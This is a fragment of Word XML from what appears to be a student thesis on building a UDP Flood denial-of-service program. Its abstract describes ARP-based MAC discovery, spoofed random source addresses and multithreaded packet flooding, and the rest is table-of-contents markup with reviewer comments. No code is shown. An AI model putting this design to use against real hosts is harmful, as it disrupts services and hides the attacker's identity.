          <w:t>Based on the analysis of the working principle of UDP protocol, this paper designs and implements the UDP Flood attack program. The program can construct the corresponding UDP packets to send, analyze and parse the response packets to the designated port of the specified host, and decide whether the UDP port specified by the host is open according to the contents of the packet. The MAC address of the specified host can be obtained through the ARP protocol As the destination MAC of the UDP packet; randomly generating the source MAC address, source IP address and source port of the UDP packet, configuring the Ethernet header, IP header and UDP packet of the UDP packet; using the multi-thread technology to send a large number of packets to the specified host Forged UDP packets, attack the target host.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="392E320E" w14:textId="671A002F" w:rsidR="000238C0" w:rsidDel="00EC1F28" w:rsidRDefault="00134988" w:rsidP="00134988">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:firstLine="420"/>
        <w:rPr>
          <w:del w:id="40" w:author="yong li" w:date="2017-05-14T10:53:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="41" w:author="yong li" w:date="2017-05-14T10:52:00Z">
        <w:r w:rsidDel="00EC1F28">
          <w:delText xml:space="preserve"> recent years, worms, distributed denial of service attacks DDoS and spam has become the current three major threats in the field of network security, and in the world caused a high degree of attention. Which distributed denial of service attacks DDoS to easy to implement, difficult to prevent, difficult to track and so on the characteristics of the current most common network attack technology, greatly affected the network and business hosting system to provide effective services. Through the implementation of UDP Flood attack procedures, you can understand the common network scanning and attack technology.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="58843BE2" w14:textId="35C1B340" w:rsidR="00150B71" w:rsidRPr="00E90326" w:rsidDel="00EC1F28" w:rsidRDefault="00134988" w:rsidP="00134988">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="312" w:lineRule="auto"/>
        <w:rPr>
          <w:del w:id="42" w:author="yong li" w:date="2017-05-14T10:53:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="43" w:author="yong li" w:date="2017-05-14T10:53:00Z">
        <w:r w:rsidDel="00EC1F28">
          <w:delText>Based on the deep analysis of the working principle of ARP, ICMP, UDP and other network protocols, this paper designs and implements the UDP Flood attack program based on WinPcap data capture and sending. You can choose the network card, the host scan, you can get the specified host MAC address, UDP port scanning, the final implementation of UDP Flood attack.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0FEB2F42" w14:textId="7DC6746F" w:rsidR="00150B71" w:rsidRPr="00E90326" w:rsidDel="00EC1F28" w:rsidRDefault="00150B71" w:rsidP="00FE73A0">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="312" w:lineRule="auto"/>
        <w:rPr>
          <w:del w:id="44" w:author="yong li" w:date="2017-05-14T10:53:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="45" w:author="yong li" w:date="2017-05-14T10:53:00Z">
        <w:r w:rsidRPr="00E90326" w:rsidDel="00EC1F28">
          <w:rPr>
            <w:rFonts w:eastAsia="黑体"/>
            <w:b/>
          </w:rPr>
          <w:delText>Key</w:delText>
        </w:r>
        <w:r w:rsidRPr="00E90326" w:rsidDel="00EC1F28">
          <w:rPr>
            <w:rFonts w:eastAsia="黑体" w:hint="eastAsia"/>
            <w:b/>
          </w:rPr>
          <w:delText>w</w:delText>
        </w:r>
        <w:r w:rsidRPr="00E90326" w:rsidDel="00EC1F28">
          <w:rPr>
            <w:rFonts w:eastAsia="黑体"/>
            <w:b/>
          </w:rPr>
          <w:delText>ords</w:delText>
        </w:r>
        <w:r w:rsidRPr="00E90326" w:rsidDel="00EC1F28">
          <w:rPr>
            <w:rFonts w:eastAsia="黑体" w:hAnsi="Arial"/>
            <w:b/>
          </w:rPr>
          <w:delText>：</w:delText>
        </w:r>
        <w:r w:rsidR="00D65FD1" w:rsidRPr="00E90326" w:rsidDel="00EC1F28">
          <w:rPr>
            <w:rFonts w:hAnsi="宋体"/>
          </w:rPr>
          <w:delText>UDP F</w:delText>
        </w:r>
        <w:r w:rsidR="00D65FD1" w:rsidRPr="00E90326" w:rsidDel="00EC1F28">
          <w:rPr>
            <w:rFonts w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>lood</w:delText>
        </w:r>
        <w:r w:rsidR="00D65FD1" w:rsidDel="00EC1F28">
          <w:rPr>
            <w:rFonts w:hAnsi="宋体"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
        <w:r w:rsidR="00D65FD1" w:rsidDel="00EC1F28">
          <w:rPr>
            <w:rFonts w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>attack</w:delText>
        </w:r>
        <w:r w:rsidR="00D65FD1" w:rsidDel="00EC1F28">
          <w:rPr>
            <w:rFonts w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>；</w:delText>
        </w:r>
        <w:r w:rsidR="00D65FD1" w:rsidDel="00EC1F28">
          <w:rPr>
            <w:rFonts w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>WinPcap</w:delText>
        </w:r>
        <w:r w:rsidR="00D65FD1" w:rsidDel="00EC1F28">
          <w:rPr>
            <w:rFonts w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>；</w:delText>
        </w:r>
        <w:r w:rsidR="00D65FD1" w:rsidRPr="00D65FD1" w:rsidDel="00EC1F28">
          <w:rPr>
            <w:rFonts w:hAnsi="宋体"/>
          </w:rPr>
          <w:delText>Network scanning</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4C80B94A" w14:textId="76AAADE8" w:rsidR="00150B71" w:rsidRPr="00E90326" w:rsidDel="00EC1F28" w:rsidRDefault="00150B71" w:rsidP="00150B71">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:del w:id="46" w:author="yong li" w:date="2017-05-14T10:53:00Z"/>
          <w:i/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="547D3804" w14:textId="4F06FE2A" w:rsidR="00150B71" w:rsidRPr="00E90326" w:rsidDel="00EC1F28" w:rsidRDefault="00150B71" w:rsidP="00150B71">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:del w:id="47" w:author="yong li" w:date="2017-05-14T10:53:00Z"/>
          <w:i/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62DAC1F6" w14:textId="77777777" w:rsidR="00150B71" w:rsidRPr="00E90326" w:rsidRDefault="00150B71">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:sectPr w:rsidR="00150B71" w:rsidRPr="00E90326" w:rsidSect="00321382">
          <w:headerReference w:type="even" r:id="rId14"/>
          <w:headerReference w:type="default" r:id="rId15"/>
          <w:footerReference w:type="even" r:id="rId16"/>
          <w:footerReference w:type="default" r:id="rId17"/>
          <w:headerReference w:type="first" r:id="rId18"/>
          <w:footerReference w:type="first" r:id="rId19"/>
          <w:pgSz w:w="11906" w:h="16838"/>
          <w:pgMar w:top="1701" w:right="1418" w:bottom="1418" w:left="1418" w:header="1134" w:footer="992" w:gutter="0"/>
          <w:pgNumType w:fmt="upperRoman" w:start="1"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="326"/>
        </w:sectPr>
        <w:pPrChange w:id="48" w:author="yong li" w:date="2017-05-14T10:53:00Z">
          <w:pPr>
            <w:pStyle w:val="10505"/>
            <w:numPr>
              <w:numId w:val="0"/>
            </w:numPr>
            <w:tabs>
              <w:tab w:val="left" w:pos="432"/>
            </w:tabs>
            <w:spacing w:before="120" w:after="120"/>
            <w:ind w:left="0" w:firstLine="0"/>
          </w:pPr>
        </w:pPrChange>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49" w:name="_Toc480380105"/>
      <w:bookmarkStart w:id="50" w:name="_Toc480383329"/>
      <w:bookmarkStart w:id="51" w:name="_Toc480446919"/>
      <w:bookmarkStart w:id="52" w:name="_Toc480465998"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>目录</w:t>
      </w:r>
      <w:bookmarkEnd w:id="49"/>
      <w:bookmarkEnd w:id="50"/>
      <w:bookmarkEnd w:id="51"/>
      <w:bookmarkEnd w:id="52"/>
    </w:p>
    <w:p w14:paraId="646D03B9" w14:textId="3A845A2E" w:rsidR="002C4A81" w:rsidRDefault="00150B71">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="53" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>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ins w:id="54" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidR="002C4A81" w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="002C4A81" w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r w:rsidR="002C4A81">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522600"</w:instrText>
        </w:r>
        <w:r w:rsidR="002C4A81" w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r w:rsidR="002C4A81" w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002C4A81" w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>摘要</w:t>
        </w:r>
        <w:r w:rsidR="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522600 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="002C4A81">
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="002C4A81">
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="55" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidR="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>I</w:t>
        </w:r>
        <w:r w:rsidR="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidR="002C4A81" w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4534ADCB" w14:textId="2561F72F" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="56" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="57" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522601"</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Abstract</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522601 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="58" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>II</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="10FC1991" w14:textId="39F14F45" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="59" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="60" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522602"</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2C4A81">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
            <w:b/>
            <w:noProof/>
            <w:rPrChange w:id="61" w:author="yong li" w:date="2017-05-14T10:54:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>绪论</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522602 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="62" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="326D9AD4" w14:textId="278D41ED" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="63" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="64" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522603"</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1.1</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课题背景</w:t>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
            <w:noProof/>
          </w:rPr>
          <w:t>（DDos不能引出UDP Flood攻击吧。应从攻击开始写，别从DDos开始）</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522603 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="65" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="31D997F9" w14:textId="048F46EC" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="66" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="67" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522604"</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1.2</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课题发展状况</w:t>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:t>（</w:t>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:t>“</w:t>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:t>课题发展状况</w:t>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:t>”</w:t>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:t>的字体和</w:t>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:t>“</w:t>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>课题背景</w:t>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:t>”</w:t>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:t>的</w:t>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:t>不一样，看目录）</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522604 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="68" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="03A806F3" w14:textId="3B3F4C7D" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="69" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="70" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522605"</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1.3</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:asciiTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>研究的目的</w:t>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:noProof/>
            <w:kern w:val="16"/>
          </w:rPr>
          <w:t>（以下内容参考张海阳的写）</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522605 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="71" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="601F436F" w14:textId="330F36FF" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
